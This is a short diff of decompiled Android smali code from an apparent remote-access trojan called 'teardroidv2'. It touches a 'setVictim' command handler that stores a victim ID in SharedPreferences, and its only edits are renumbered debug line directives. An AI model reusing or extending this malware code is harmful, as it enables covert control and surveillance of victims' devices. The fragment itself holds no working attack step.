@@ -73,7 +73,7 @@
 .method public bridge synthetic invoke(Ljava/lang/Object;)Ljava/lang/Object;
     .locals 0
 
-    .line 167
+    .line 155
     check-cast p1, Lorg/json/JSONObject;
 
     invoke-virtual {p0, p1}, Lcom/example/teardroidv2/CommandReciver$setVictim$1;->invoke(Lorg/json/JSONObject;)V
@@ -90,14 +90,14 @@
 
     invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V
 
-    .line 161
+    .line 149
     iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver$setVictim$1;->$VictimDataStore:Landroid/content/SharedPreferences;
 
     invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
 
     move-result-object v0
 
-    .line 162
+    .line 150
     sget-object v1, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;
 
     invoke-virtual {v1}, Lcom/example/teardroidv2/AppInfo;->getVictimID()Ljava/lang/String;
@@ -112,10 +112,10 @@
 
     invoke-interface {v0, v1, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
 
-    .line 163
+    .line 151
     invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
 
-    .line 164
+    .line 152
     iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver$setVictim$1;->this$0:Lcom/example/teardroidv2/CommandReciver;
 
     invoke-virtual {p1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
